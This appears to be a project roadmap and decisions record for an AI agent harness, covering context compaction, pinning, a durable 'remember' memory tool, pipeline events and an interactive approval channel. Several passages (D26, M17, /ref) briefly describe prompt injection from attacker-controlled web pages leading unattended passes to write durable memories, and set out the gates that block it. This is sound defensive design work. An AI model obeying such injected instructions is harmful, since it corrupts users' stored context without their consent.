- **`COMPACTION_WARNING_MARGIN_TOKENS` is the one worth thinking about up front**, because it's the only one whose wrong value is not self-correcting: it decides whether the early warning arrives with enough room left to actually do something (pin a message, wrap up a thought, trigger `/compact` manually at a natural break). Too small and it's an alert with no time attached to it. It must also always be strictly smaller than `COMPACTION_BUFFER_TOKENS`, or the warning fires after the thing it's warning about — validate that relationship, don't just document it.
- **Surface the effective values.** A `/config` or startup line showing which values are in force and where each came from turns "compaction feels too aggressive" from a mystery into a one-line answer. Cheap now, and the alternative is debugging a number three files away from where it was set.

- **`keep`** — the most recent N tokens/messages always stay verbatim, matching the opencode-style pattern this is deliberately modeled on.
- **`buffer`** — headroom before the hard context limit; compaction fires at `context_used >= context_limit - buffer`.

**(Rev. 3) Where `context_limit` and `context_used` come from** — Rev. 2's Open Question 5, now specified, since nothing in the codebase provides either today.

`context_limit`: a `MODEL_CONTEXT_WINDOWS: dict[str, int]` lookup in `config.py`, keyed by model name, with a `DEFAULT_CONTEXT_WINDOW` fallback. Deliberately *not* a per-provider API query: `providers.json.example` ships a roster of fifteen providers, most reaching the same OpenAI-compatible path, and there is no uniform endpoint exposing context length across them — a query-based design would need fifteen adapters to avoid a fallback constant it would end up needing anyway. A static table is honest about being incomplete, and the entries that matter are the handful of models actually configured. **Log at WARNING on fallback** (`logging_setup.py` exists for this, per ROADMAP §1), because a wrong-by-default window means compaction fires at the wrong time in whichever direction the guess is wrong, and silent guessing is what turns a tuning problem into a mystery.

`context_used`: `ModelResponse.usage["input_tokens"]` from the most recent call already *is* the measured size of everything the model was sent — no estimator needed, and it comes from the provider rather than from a local tokenizer that would have to be right per model. This is exact but retrospective: it reflects the previous turn, so the check runs after a response and fires compaction before the *next* call. Before the first call of a resumed thread there is no measurement yet, which is the one place a rough character-based estimate is needed. **This is what makes D21 load-bearing rather than pedantic** — if streaming silently reports zero usage, `context_used` stays 0, compaction never fires, and the harness runs into a hard context-limit error from the provider instead. The token-budget stop condition and the compaction trigger fail together, from the same cause.
- **`strength` is an objectively measurable target, not a qualitative instruction** — this directly answers the concern that a purely qualitative dial ("be more aggressive") would behave differently across models with different summarization tendencies, which is true and not fixable by prompting harder. Strength 1 through 5 maps to a **target compression ratio** (e.g. roughly 40% / 25% / 15% / 10% / 5% of the original segment's token count) — a number that's checkable after the fact by literally counting the resulting summary's tokens, unlike a vibe. If the compactor's output misses the target range, send a corrective follow-up ("that summary is 60% of the original; target is 25%, tighten it") and retry, bounded by `COMPACTION_MAX_RETRIES` — structurally the same mechanism as ROADMAP §3's JSON-retry loop, checking a length constraint instead of JSON validity, rather than a new pattern invented from scratch. Qualitative guidance ("preserve key decisions and their rationale over exploratory dead-ends") still belongs in the compactor's prompt, shaping *what* survives within the budget — the budget itself just stays a hard, verifiable number.

### Visibility (no silent compaction, ever)

Both automatic and manual (user-triggered, e.g. `/compact` in the TUI) compaction show a visible marker inline — something like `— 47 earlier messages compacted into summary —` — consistent with this project's established "fail/act loudly, never silently" pattern (`credentials.py` raising rather than defaulting quietly, `get_thread` raising on an unknown id rather than starting empty). A separate early-warning notification ("older messages may be compacted soon") fires at the smaller `COMPACTION_WARNING_MARGIN_TOKENS` threshold, strictly before the buffer's own trigger point — same estimation logic as `buffer`, evaluated slightly earlier, no new machinery. No confirmation is required for either the warning or the compaction itself.

### Thread-scoped pinning: `pin` tool

```python
# new column on MessageLog
pinned: bool = Field(default=False)
```

`pin(message_ref)` flags a specific message (or the last N turns) as compaction-exempt within its own thread — the compactor simply skips pinned rows when deciding what to fold into a summary.

**(Rev. 3) `message_ref` has nothing to refer to yet, and that constrains the design.** `MessageLog.id` exists, but `get_session_history()` deliberately reconstructs a *provider-neutral shape* that omits it — `{"role", "content"}`, `{"role", "text", "tool_calls"}`, `{"role", "tool_call_id", "content"}`. The model therefore never sees a message id and cannot name one. `core/memory.py`'s docstring is explicit that the neutral shape is exactly what gets persisted and reconstructed, with no post-hoc reshaping on either side, so adding an `id` key is not a free change: `_messages_for_provider()` translates these dicts per provider, and an unexpected key reaching a provider payload is a wire-format error rather than a harmless extra field.

Two options, and the recommendation is the second:

- *Surface ids in the neutral shape.* Requires auditing all three provider translation branches to strip it before the wire. Enables precise pinning, at the cost of putting a persistence-layer concept into the provider-neutral contract the whole memory design is built on keeping clean.
- **Recommended: keep the model's interface ordinal, resolve to ids internally.** `pin(last_n: int = 1)` — "pin the last N turns" — needs no id, matches how the tool would realistically be used mid-conversation ("remember this bit"), and keeps `MessageLog.id` an implementation detail. `ConversationMemory` maps the ordinal to real row ids when it writes the `pinned` flag, since it alone knows the thread's ordering.

The same gap affects `CompactionCheckpoint.covers_up_to_message_id` from the other direction — that one is written by harness code rather than by the model, so it can use real ids freely, but **`get_session_history()` needs a new `after_message_id` parameter** to load only the uncompacted tail. Resolving "rows after X" means looking up X's `created_at` and filtering greater-than, since ordering is by timestamp rather than by an autoincrementing sequence; `created_at` has microsecond resolution so ties are unlikely, but the query should be `(created_at, id)`-ordered to be deterministic regardless. This is a real `storage.py` change beyond the new tables and column already listed in the Modified Files table.

### User/project-scoped durable memory: `remember` tool

```python
class UserMemory(SQLModel, table=True):
    id: UUID = Field(default_factory=uuid4, primary_key=True)
    content: str
    category: Optional[str] = None
    scope: str = "project"   # "project" | "global" -- LOCKED (D25), see below
    source_thread_id: UUID
    created_at: datetime
```

Injected as a third context tier alongside `CONTEXT.md`, gated the same way — an agent opts in via `use_memory: true` in its frontmatter, rather than every memory being force-fed into every conversation regardless of relevance.

**Scope default (D25, locked): `"project"`.** `remember(content, scope="global")` remains available per call and the model should be told in the tool description when to reach for it — durable *preferences* about how to work ("prefers concise answers", "wants tests written before implementation") are the global-shaped case, and facts about a specific codebase are not. A project-scoped memory is keyed to the same resolved project path the workspace-trust store uses (D17), so "which project" means one thing across the whole system rather than two.

**Approval (D26, locked): `remember` requires approval, `pin` does not.** Concretely, per D24 both need declared fields in both dataclasses:

```python
# config.py -- ToolPermissions
pin: bool = True
remember: bool = True

# config.py -- ToolApprovals
pin: bool = False
remember: bool = True     # durable, cross-session, invisible when it later takes effect
```

Two consequences worth stating rather than discovering:

1. **`remember()` cannot fire on headless paths, by construction.** §13 specifies that with no `permission_channel` (CLI, and every deep-research pipeline pass), anything requiring approval is denied by default. So research passes can't write durable memories. That is the right outcome — a ten-pass pipeline running unattended is exactly the context where an injected "remember this" from fetched web content would be most dangerous and least noticed — but it means the pipeline must not be designed to depend on `remember()` for carrying anything forward. It already has `PipelineContext` for that.
2. **If the prompt proves too frequent in practice, don't relax it — move it.** An approval prompt that fires often enough to be dismissed reflexively is worse than no prompt, because it launders consent. The fallback, if that happens, is the pattern §21 already uses for compaction: make it *visible and undoable* instead of gated — a `— remembered: "..." —` marker inline plus a `/forget` command — rather than dropping the gate and leaving the write silent. Same principle ("never silently do consequential things"), different mechanism.

### Also served by this machinery (requested during §16)

Both of these were asked for as TUI features and are really this section's:

- **Session summaries** — the same operation as compaction: an agent distilling a thread segment. `CompactionCheckpoint` and `agents/builtin/compactor.md` (this section) will be this -- neither exists yet, and `config_loader` warns that compaction settings are present but unimplemented; a user-facing summary is that machinery invoked deliberately rather than by a token threshold. Building it separately in §16 would have meant either duplicating the compactor or pre-empting it.
- **`/ref` cross-thread referencing** — user-initiated: a thread picker (§16 already has one, over `storage.list_threads()`), then the chosen thread's **distilled summary** injected into the current thread. **Decided: user-initiated rather than a model-callable search tool** — the user chooses what crosses, so nothing fetched in one thread can steer another without their say-so. It defers to here rather than to §16 because it needs something to inject, and the compactor is the summariser. Matches the project's "distill, don't share raw history" principle; a model-initiated `search_threads` remains possible later on top of the same retrieval, with an approval gate on D26's reasoning.

### Decisions record (M1–M10), added at build time

§21 was split at build time. **§21a (BUILT)** is compaction, the checkpoint, the
hyperparameters and `pin`. **§21b (BUILT)** is durable `remember` / `use_memory` /
`/memories` / `/forget`. **§21c (BUILT)** is `/ref` and session summaries — see M18–M21
below. Each is independently useful and
independently testable, and §21a is roughly §20-sized on its own.

Tracing this section against the code before writing any surfaced two holes in its
own acceptance criteria and one parameterization that could never fire. These are
the resolutions.

**M1 — Compaction defends the working set, not the context window.** The spec above
puts the trigger at `context_limit - buffer`. It cannot fire there. `core/loop.py`
counts input tokens *per call* and the prompt is resent on every step of a
tool-using turn, so `MAX_TOKEN_BUDGET` makes a turn unusable long before any modern
window: at ~2k of tool result per step, a 20k-token thread gets about 9 steps, a 50k
thread about 2, and a 100k thread exactly one response with no tool calls at all. A
window-derived threshold therefore sits at a size the thread can never reach in
working order. For compaction at threshold `T` to fire *and* leave `k` usable steps,
the budget must be roughly `k·T`.

So `COMPACTION_TRIGGER_TOKENS` is a working-set target (40k) largely independent of
the model, `MAX_TOKEN_BUDGET` rises from its self-described placeholder 100k to
250k, and `effective_compaction()` warns when a configured trigger leaves too little
headroom — the relationship validated rather than documented. `settings.json`'s
`compaction.buffer_tokens` is renamed `trigger_tokens` to match; the keys had been
inert since §14, so nothing depended on the old spelling.

This also defuses a risk this section flagged about itself: `MODEL_CONTEXT_WINDOWS`
survives only as the pipeline backstop's source, so a missing entry costs a mistimed
backstop rather than mistimed compaction.

**M2 — Re-derive from the archive; chain only as a bounded fallback.** The spec
never says whether a later compaction summarizes the originals or the previous
summary, and that — not the trigger height — is what governs fidelity. Re-deriving
means exactly one summarization step always sits between an original message and
what the model sees, however many times compaction has run, which is what makes an
early trigger free in fidelity terms rather than a tradeoff. `strategy: "chain"`
forces the constant-cost alternative, and re-derivation falls back to it (traced)
when the span outgrows a single call.

**M3 — Turn boundary is the primary trigger; a mid-turn valve exists and is
structurally guarded.** Both live inside `_run()`, the one choke point all three
shells pass through. A turn can add far more than any buffer covers —
`MAX_READ_CHARS` alone is ~12.5k tokens per `read` call, up to `max_steps` of them —
so waiting for the next boundary would let one tool-heavy turn reach the provider's
hard limit.

**M4 — The fold boundary lands on a turn start and never splits an assistant
message from its tool results.** Not a quality concern: a `tool_result` with no
preceding `tool_use` is an HTTP 400 on Anthropic, a hard wire error on the next call
of a thread that worked a moment ago.

**M5 — Three floors, earliest wins.** The current turn (structural — `_run()`
records how many turns were complete when it began, so a summary can never rewrite
the question being answered), the last 3 completed turns, and
`keep_recent_tokens`. The turn floor is not in the original spec and is needed
because one tool-heavy turn can consume the whole token budget by itself, leaving
the immediately preceding exchange summarized — a follow-up like "no, the other one"
then has no referent. An empty span is a real state, reported rather than silently
skipped.

**M6 — Research passes compact only at a hard backstop** near the context window,
never at the working-set trigger. A pass is headless and unattended and already
returns a distillation, so routine compaction there would spend on a judgment call
nobody is watching. `run_deep_research_mode` passes the mode explicitly.

**M7 — `MessageLog.pinned` needs a migration, and nothing here had one.**
`create_db_and_tables()` calls `create_all()`, which creates missing *tables* and
never `ALTER`s, so this — the first field ever added to a shipped table — would
break every existing `app.db` on the first `SELECT`, silently, at read time rather
than at startup, and invisibly on a machine with a fresh database.
`database.ensure_columns()` closes it: additive only, warning rather than raising on
a type mismatch, since SQLite has type affinity rather than enforcement and refusing
to start over a cosmetic difference would be a self-inflicted outage in the one code
path every launch runs through.

**M8 — The checkpoint summary is a synthesized leading `user` message, never a
`MessageLog` row.** The neutral shape has no system role, so a leading user message
is the one form all three providers accept. Persisting it would put derived content
in an append-only archive whose whole value is being original — and the next
compaction would summarize the previous summary as if it were something the user
said, chaining by accident on the code path that means to re-derive.

**M9 — Pinned rows inside the covered span are re-included verbatim.** AC1 (archive
intact) and AC2 (pinned rows never summarized) cannot both hold through
`after_message_id` alone: `covers_up_to_message_id` is a single watermark and cannot
express "everything through K except rows 5 and 6". The view is
`summary + pinned-rows-before-the-watermark + tail`. Without this the one message a
user explicitly asked to keep is the one message that disappears.

**M10 — The compression ratio is measured by character proxy, and says so.** The
spec asks for the summary's tokens to be counted; no tokenizer is available offline
and `usage["input_tokens"]` measures a whole prompt rather than a segment of one.
Chars/4 applied to both sides is self-consistent, which is all a ratio check needs —
it is never compared against a provider's count.

**M11 — Turn counting is ARCHIVE-space, never view-space.** Added by the §21a
review pass, which found the section had shipped broken without it.

M8 makes the checkpoint summary a `role: "user"` message, and that is right — the
neutral shape has no system role, so it is the only form all three providers accept.
The consequence was not traced: **the derived view therefore contains a user message
that is not a turn**, so every turn counter over the view is off by one, and any
value derived that way is in a different space from the archive turn indices
`compactable_span()` compares it against.

Both counters were wrong. `_completed_turns` counted view user-messages and was
`min()`'d against an archive index; the keep-tokens floor sliced the view and mapped
positions back onto the archive's turn list. On an *uncompacted* thread the two
spaces coincide exactly, which is why 849 tests passed. On a compacted one the floor
came out several turns too low, the computed watermark went BACKWARDS, and since
`latest_checkpoint` resolves by timestamp the backwards checkpoint became live: the
second automatic compaction of a thread **un-compacted it**.

So: `compactable_span()` derives every floor from one load of the archive rows, which
makes the mismatch unrepresentable rather than merely corrected, and
`completed_turns()` lives on `ConversationMemory` (the file that owns the thread's
persistence — `core/loop.py` imports no storage and should not start). Archive-space
also makes the value time-invariant within a turn, so it is computed lazily on the
compact path and cannot go stale when a mid-turn compaction rebuilds the view.

**The watermark-advances invariant is enforced, not assumed.** `compact()` skips
before spending a model call when the boundary has not moved past the last
checkpoint; `save_checkpoint()` refuses a watermark that does not advance, because
the caller-side check only covers the one caller that exists today. Same posture as
D24's declared-permission check: the invariant is cheap to state and its violation is
silent and durable.

### Decisions record (M12–M17), added at §21b's build

Tracing §21's durable-memory block against the code turned up one spec gap, one
security hole and three unstated behaviours.

**M12 — `UserMemory` needs a `project_path` column the spec omits.** D25 says a
project-scoped memory is "keyed to the same resolved project path the workspace-trust
store uses", but the schema block above carries only `scope`. With no path recorded,
`"project"` cannot tell two projects apart — so AC6 ("that memory does not surface in
a thread opened from a different project directory") was not merely unenforced, it was
unwriteable as a test. `project_path` holds the realpath for `scope="project"` and
`None` for `"global"`, from a new `config_loader.get_project_path()` over the value
`initialize()` already resolved.

**M13 — Plain chat counts as opted in, and the fragment goes OUTSIDE
`with_catalogs()`.** `system_prompt_for()` — the only place `CONTEXT.md` is injected
— is reachable solely when running as an agent, so the literal reading of "an agent
opts in via `use_memory: true`" makes memories invisible in ordinary chat, which is
the main case and the §25 shape: a capability a whole shell cannot reach. The
frontmatter parser already defaults `use_memory` to `True`, so an agent that says
nothing gets them; "no agent at all" is treated the same. `use_memory: false` still
opts out, which is how the compactor and the pipeline reviewer stay out of a user's
durable facts.

`memories.manager.prompt_fragment()` is the single assembly point, mirroring
`skills.manager.prompt_fragment`, appended by its three CALLERS — never inside
`with_catalogs()`, which feeds `pass_prompt()` and would put every memory into all ten
research passes. §19 recorded that as K6 for skill bodies; this is its second instance.

Consequence, stated rather than discovered: research passes neither read nor write
memories. They never reach `system_prompt_for`, and D26 already stops them writing.

Also settled here: **an unresolved project means NO memories, not global-only.**
`get_project_path()` returns `None` exactly when `initialize()` has not run, and
`main.py` runs it at startup — so that state is "there is no session", and answering
with rows would mean reading a database on behalf of one that does not exist. Same
convention `get_agents()`/`get_skills()` already set.

**M14 — Injection is capped by count, and the cap is stated in the text the model
reads.** Every in-scope memory would otherwise enter every turn forever, which is the
unbounded context growth §21 exists to fight — reintroduced by the feature meant to
complement it. `config.MAX_INJECTED_MEMORIES` (50), newest first, because recency is
the only staleness signal available without asking a model. The truncation appears in
the fragment as well as in a log: the model is the consumer, and one that can see it
is looking at a truncated list can say so, while a log line reaches nobody
mid-conversation. Same "no silent caps" rule as §20's `MAX_REVIEW_FINDINGS`.

**M15 — `/memories` and `/forget` ship with §21b, not as D26's fallback.** §21 frames
`/forget` as what to build *if* the approval prompt proves too frequent. Staleness is
a different problem the gate never touches: a memory approved when it was true
survives the thing that made it false. Without removal one wrong memory is permanent,
and listing is what makes removal usable, since the model never shows ids. The CLI
gets `--memories` / `--forget` as flags because it has no slash-command layer — and
because M16 makes a CLI-only user able to *write* a memory, so they would otherwise
have no way to remove one. Removal is by id, never by content substring: a substring
matching two memories would have to pick one or refuse, and picking silently deletes
something the user did not name.

**M16 — CLI chat gains a general `ApprovalProvider`, and the reach is the point.**
§13 does not merely DENY an approval-gated tool where nothing can answer; it stops
advertising it. So CLI chat could not see `shell`, `spawn_subagent`, `remember` or any
MCP tool at all. A provider makes all of them advertised and promptable, matching what
the TUI has always done — intended, and larger than the one tool §21b needed it for.

Carried as a `RunAuthorization` with an empty grant set rather than a new
`approval_provider=` parameter, so it reuses `_authorization_kwargs`; a provider means
"someone is here to ask", never "these tools are pre-approved". `honour_run_scope=True`
for chat and `False` for attended research, and the two must not converge — chat wants
§18's per-run shortcut, attended research exists for per-call supervision. `None` on a
non-tty, matching `build_review_consent`, so a piped run stays headless.

**M17 — `remember` is never pre-grantable.** *(As built, it joined a `PIPELINE_UNGRANTABLE` frozenset; R13 moved the answer onto the ToolSpec as `grant_policy=GRANT_NEVER` and the frozenset is gone. #67 found that the frozenset had never reached §18's subagent sign-off, which D26's consequence 1 is equally about.)* It has no `approval_check`, so
§25's R2 rule makes it grantable and it would have appeared in the research grant
picker. One `--grant remember` at launch would let ten unattended passes — reading
attacker-controlled web pages — write durable cross-session memories. That is exactly
what D26's consequence 1 says must not be possible, and R4's reasoning about one
launch-time tick compounding into unbounded delegated authority applies word for word.
Found by tracing D26's stated consequence against §25's actual grant rule; neither
document is wrong alone.

**Carried to §21b**, decided during §21a's design and not built there: wire §25's
`ApprovalProvider` into CLI chat, so D26's approval-gated `remember` is reachable in
the default shell. Without it §13's headless rule makes `remember` invisible
everywhere but the TUI — the §25 cautionary tale, one section later. `pin` needs no
approval (D26), so §21a does not depend on it.

### Decisions record (M18–M21), added at §21c's build

**M18 — a thread summary gets its OWN TABLE, not a `CompactionCheckpoint` row with a
different `strategy`.** The two carry nearly identical columns and mean opposite
things: `latest_checkpoint` resolves by timestamp and feeds
`ConversationMemory._derived_view()`, so writing one is an edit to a live conversation,
while a summary is a description that changes nothing. A summary row in that table
would therefore silently compact the thread it was meant to describe, and would win by
being newest. Two tables make that impossible instead of documented. `extra_data` was
the other candidate and was rejected for T1's reason — an opaque JSON blob cannot be
filtered in SQL, and the roadmap keeps a future `search_threads` open.

Its consequence, stated because it looks like an oversight: **`save_thread_summary` has
no advance guard while `save_checkpoint` does.** A backwards compaction watermark
un-compacts a thread; a redundant summary row can only describe a thread as it was a
moment ago, which the next `advances()` check notices. The guard would be cargo, and
copying it would imply the two writes are the same kind of thing.

**M19 — a referenced summary is a PROMPT TIER, not a message.** `with_refs` sits beside
`with_goal` and `with_memories`, reading a list off the thread's `extra_data`. The
alternative — writing `[Reference from thread X] …` into the archive as a `user`
message — was rejected on §27's ground: replay would render harness-generated text
under a `you ›` label, which M8 forbids, and a later compaction would summarise the
summary. Appended OUTSIDE `with_catalogs()` (K6's third instance) and
**unconditionally**, unlike memories: a reference belongs to the thread rather than to
an agent, and `system_prompt_for()` has no memory object to read one from.

**M20 — `/summary` describes, `/compact` folds.** §21's text treats "session summaries"
as compaction invoked deliberately, which §21a's `/compact` already is. What remained
unserved is the request that produced the feature: *show me what this conversation has
been about*, without shortening what the model sees next turn. Two different requests
that share a summariser.

**M21 — the CLI gets flags (`--summary`, `--ref`), not a slash-command layer.** M15's
precedent, for M15's reason: the CLI has no command layer, and adding one is §23's
business, where the response channel it would share is already specified. The accepted
limit is that a CLI user attaches a reference at launch rather than mid-conversation.

**The summary target is absolute, not a `COMPACTION_TARGET_RATIOS` entry.** A ratio is
correct for a fold, where the summary replaces the span it came from and the thread
shrinks either way. §21c's summary is injected on EVERY turn of the referencing thread
with nothing bounding it, so a 500KB source at strength 3 would inject 75KB
indefinitely. `config.SUMMARY_TARGET_CHARS` is passed as `_summarize`'s `target`, which
takes plain values and needed no change. A thread already shorter than the budget is
stored verbatim and costs no model call.

### Acceptance criteria

1. Compaction never modifies or deletes rows in `MessageLog` — only adds `CompactionCheckpoint` rows. A full-history query against `MessageLog` alone always returns everything ever said, regardless of how many times compaction has run.
2. A pinned message is never included in what the compactor is asked to summarize.
3. A compaction whose output falls outside the target ratio for the configured `strength` triggers a corrective retry, bounded by `COMPACTION_MAX_RETRIES`.
4. The early-warning notification fires strictly before the compaction-trigger threshold, using the same context-size estimation the trigger itself uses.
5. `remember()` output is visible in a later, different thread only when that later agent has `use_memory: true` and the memory's `scope` matches.
6. **(D25) `remember()` with no explicit `scope` writes a `"project"`-scoped row**, keyed to the same resolved project path the trust store uses — and that memory does not surface in a thread opened from a different project directory.
7. **(D26) `remember()` is denied on a path with no approval channel** (CLI, pipeline passes) rather than writing silently; `pin()` succeeds on those same paths. Both tools have declared fields in `ToolPermissions` and `ToolApprovals`, per D24's consistency check.
8. **(D27) A `compaction` block in a trusted project's `settings.json` overrides the `config.py` defaults**, a user-level `settings.json` overrides `config.py` but loses to the project, and an out-of-range value (`strength: 9`, or `warning_margin >= buffer`) is rejected with a clear message at load time rather than producing incoherent trigger math later.
9. **(§21c) A thread summary leaves the thread it describes untouched** — no `CompactionCheckpoint` row, and the derived view identical before and after.
10. **(§21c) A summary of a compacted thread describes the original conversation**, not the compaction summary, and a second summary of an unchanged thread costs no model call.
11. **(§21c) An attached reference reaches a chat prompt in both shells and NO research pass prompt**, states that it is not this conversation's history, and is refused rather than silently rotated once `MAX_INJECTED_REFS` is reached.

---

## 22. Pipeline observability — orchestrator events + the live research view — BUILT

**Added during §16.** The deep-research pipeline currently reports nothing while it runs. `run_deep_research_pipeline()` is synchronous; each pass is drained through `run_to_completion()` inside `orchestrator.py`, so no `LoopEvent` escapes, and the 16 per-pass `update_pipeline_run()` checkpoints write to the database rather than to a caller. §16's research view is coarse for exactly this reason — it can show that the pipeline is running and render the trace and report when it returns, and nothing in between.

This is the second §13-scale refactor: make the orchestrator a generator.

### Shape

`run_deep_research_pipeline()` becomes a generator yielding a `PipelineEvent`, with a `run_pipeline_to_completion()` drainer keeping every existing caller (the CLI, `main.run_research`, the §16 TUI worker) synchronous — exactly the shape §13 used for `_run()` / `run_to_completion()`, for the same reason.

Event kinds, at minimum: `pass_start` / `pass_complete` (with the pass id), `trace_line`, `claim_extracted`, `claim_tiered` (claim id + tier), `retry` (which claim, which attempt), and `run_complete`.

### Decide the event shape BEFORE adding to it

`LoopEvent` is a flat dataclass with an "exactly one field is populated" convention (see `core/events.py`). That was right for six kinds. §22 adds roughly seven more of a different family, and §23 adds two more — at which point a flat bag of ~15 optional fields, where the valid combinations are documented in a docstring rather than in the type, stops paying for itself.

**Decide this first**: either `PipelineEvent` is a separate type from `LoopEvent` (likely — they have different consumers and different lifetimes), or both become a tagged union. Do not simply add fields to `LoopEvent` and discover the problem at §23.

### Interaction with §5's checkpoints

The orchestrator already calls `update_pipeline_run()` after every `run.log()`. Those calls and the new events carry overlapping information, and **two independent writers of related data is the exact bug shape this project already found and fixed once** (ARCHITECTURE/DEVLOG §3.8, cited by §21's own design principle). Derive one from the other — emit the event at the checkpoint site rather than adding a parallel emission path.

### Decisions record (P1-P4)

| # | Decision |
|---|---|
| **P1** | `PipelineEvent` is a **separate type from `LoopEvent`**, **kind-discriminated** (`kind: str` plus optional payload fields), living in `core/reasoning/events.py`. Not a second flat "exactly one field is populated" bag, and not a tagged union for both families — that would rewrite every `if event.token_delta:` read in `tui/app.py`, `core/loop.py` and the streaming tests, a §13-scale breakage inside a §22 change. This discharges AC4. |
| **P2** | **No `LoopEvent` forwarding from inside a pass.** The orchestrator yields only its own kinds; each pass still runs through `run_deep_research_mode()` -> `run_to_completion()`. `core/loop.py`, `core/client.py`, `json_retry.py` and `review.py`'s internals were untouched by this section. **AMENDED BY §26** — see below. |

**P2, amended by §26.** P2 rested on a premise — that a pass's internals are not worth
seeing — and the first real ten-pass run disproved it: a Pass 1 making fourteen
`fetch_url` calls over several minutes was indistinguishable from a hang. §26 has
`_run_pass` iterate a new `RunAgentLoop.stream_deep_research_mode()` and **translate** a
chosen subset of its `LoopEvent`s into pipeline kinds.

What P2 was *protecting* still holds and is the reason the amendment is narrow: a
consumer of `stream_deep_research_pipeline()` still receives exactly one event type, so
no `if event.token_delta:` read exists outside `core/loop.py` and the streaming tests.
`client.py`, `json_retry.py` and `review.py` remain untouched. Translated, not forwarded.
| **P3** | ~~**`run_deep_research_pipeline()` keeps its name, signature and synchronous behaviour**, becoming the drainer applied to the new `stream_deep_research_pipeline()` generator. The section's own text implied the public name should become the generator; that would have churned fifteen test sites and both shells for nothing AC1 asks for, and §13's *actual* shape is a private generator with draining wrappers.~~ **RETIRED (batch 45).** The argument was sound; its premise expired within two sections. §22's own P4 gave the TUI live progress and §26 gave the CLI it, so BOTH shells moved to iterating the generator — each with a comment saying it deliberately does not call the wrapper — and "fifteen test sites and both shells" became fifty test sites and no shell. The name was then a public function with no production caller while three docstrings and AGENTS.md went on calling it the live entry point, which is the drift a stability decision is supposed to prevent rather than cause. The synchronous convenience is `tests/conftest.run_pipeline`, which is what it had become; AC1's content — a caller wanting only the finished run can get one, and the same one a streaming consumer sees — is asserted against `run_pipeline_to_completion` directly. Its pass-level twin `RunAgentLoop.run_deep_research_mode` (§26) retired with it, taking `core.loop.return_value_of` — whose only caller it was, and whose byte-identical twin `tests/conftest.drain` already existed. |
| **P4** | Consumers built: TUI transcript lines, a TUI `ResearchProgress` sidebar panel, and CLI live progress. Both shells stopped re-printing `run.trace` at the end, since every line now arrives as an event. |

### What the build found

**`run.trace` had three writers and only one of them checkpointed.** `orchestrator.py`
paired `run.log()` with `update_pipeline_run()` at twenty sites; `review.py` called
`run.log()` from fifteen places and checkpointed from none; `json_retry.py` appended
straight to the list. So AC3's "§5's per-pass persistence still fires on every trace
line" was not true when it was written. Deriving both the persistence and the events
from `run.trace` via a watermark (`_Progress`) made it true and picked the other two
writers up without editing either module — and made a JSON-parse retry visible with no
event kind of its own.

**Persist before emit.** A generator only advances while someone iterates it, so
yielding first would let a consumer that abandons the run take that checkpoint down
with it. Found by the abandoned-run test, not by reasoning.

**`GeneratorExit` is not an `Exception`.** An abandoned run therefore leaves
`status='running'`, which is honest and is recorded rather than fixed: flipping it to
`'failed'` would make an interrupted run indistinguishable from a broken one.

**Twelve test doubles stopped intercepting, silently.** Repointing the shells to the
generator made every `mocker.patch(...run_deep_research_pipeline)` a no-op that ran the
REAL pipeline. Same class of trap one layer down: a plain-function double for
`_run_pass` is not an error under `yield from` — it iterates the returned string one
character at a time and returns `None`.

**A widget method named `_render` shadows Textual's `Widget._render()`**, and the
symptom is the whole app failing to lay out with `'NoneType' object has no attribute
'get_height'`.

### Acceptance criteria

1. Every existing caller of `run_deep_research_pipeline()` still receives a finished `PipelineRun`, unchanged, via the drainer. ✓
2. A TUI consumer renders pass boundaries and claim tiers as they happen, without polling the database. ✓
3. §5's per-pass persistence still fires on every trace line, and there is exactly one place a trace line is recorded. ✓
4. The event-type decision above is made explicitly and recorded, before any event is added to `LoopEvent`. ✓ (P1, pinned by a test that fails if `LoopEvent` grows an eighth field — it has seven)

---

## 23. Interactive tools — question tool, todo list, and the response channel they share

**Added during §16. BUILT in two slices.** Slice 1: the channel (AC1), its three consumers, and §18's deferred per-tool sign-off (AC1b). Slice 2: the question tool and the todo list (ACs 2–4), plus P1's deferred event-shape decision, settled by J10 without needing a new type.

**Added during §16.** Two requested capabilities need the same missing piece: a way for a *tool* to ask the user something and block until answered. §13 built exactly one of these — `permission_channel`, a `queue.Queue` carrying a boolean — and both of these need a richer version of it.

### The shared piece first

Generalise the approval bridge into a response channel that carries a typed request and a typed response, with `permission_channel` becoming one case of it rather than a parallel mechanism. Doing the tools first and the generalisation afterwards produces two bespoke channels and a third when §18 wants one.

**The warning was right, and it was already five by the time this was built.** `permission_channel` (§13), `ApprovalProvider` (§25), `ReviewConsent` (§20), and §24 added two more — `ask_confirm_blocking` and `ask_project_kind_blocking` — in the section immediately before this one. Each re-derived the same four rules: what a dismissal carries, what a timeout means, how shutdown releases a parked worker, and how a malformed answer decodes.

### Decisions record (slice 1: J1–J8; slice 2: J9–J14)

| # | Decision | Why |
|---|---|---|
| **J1** | **`core/interaction.py`**, a leaf module beside `core/approval.py`. `Request(kind, payload, notice)` + `ResponseChannel(ask, honour_run_scope)` | Authorization DATA (what was decided, how much is left to spend) is a different thing from the MEANS of asking, which is why the two stay separate modules rather than merging |
| **J2** | **What is shared is `decode`, not the dataclasses** | A request/response pair is nearly free to write badly — five call sites can each build one and still each invent their own failure handling, which is exactly how there came to be five. One function owning the declining default per kind is the part that pays |
| **J3** | **`decode(request, raw)` takes the REQUEST, not the kind** | Two kinds cannot be validated without knowing what was asked: a CHOICE only against the options offered, a SUBAGENT_SIGNOFF subset only against the candidates listed. Passing the kind alone made both unverifiable — a shell could return a tool nobody offered and thereby grant it |
| **J4** | **`decode(Request(kind), None) == SAFE_DEFAULTS[kind]` for every kind**, pinned by a test | Lets `ask()` route its no-channel and callback-raised paths through `decode` rather than reading the table, so a kind added later cannot carry a default its decoder disagrees with |
| **J5** | **An unknown KIND raises; an unanswerable question declines** | An unanswerable question is a runtime condition to fail safe on. A question nobody defined is a bug, and inventing "no" for it would hide the typo that built the Request |
| **J6** | **Review decoding is STRICT** — a well-formed pair or nothing | The two decoders this replaced disagreed (review.py took a bare `"accept"` string, tui/app.py did not) and neither behaviour was tested. Strict wins because this is the only kind whose permissive failure APPLIES an edit rather than declining one |
| **J7** | **`ToolSpec.request_kind` / `request_payload`** carry the question's shape and its tool-specific fields | grant_scope's reason exactly: the loop asks the registry what shape of question a tool needs, so no tool name appears in `core/loop.py` |
| **J8** | **The sign-off memo is keyed by (tool, SUBJECT)**, amending S1 | `grant_scope="run"` meant a second spawn was not asked at all — and the test pinning it spawned agent `a` then agent `b`, so approving `a` authorised `b`'s whole gated set. Per-tool sign-off makes the answer agent-specific, so the memo is too. The anti-noise intent survives: the same agent twice is one prompt |
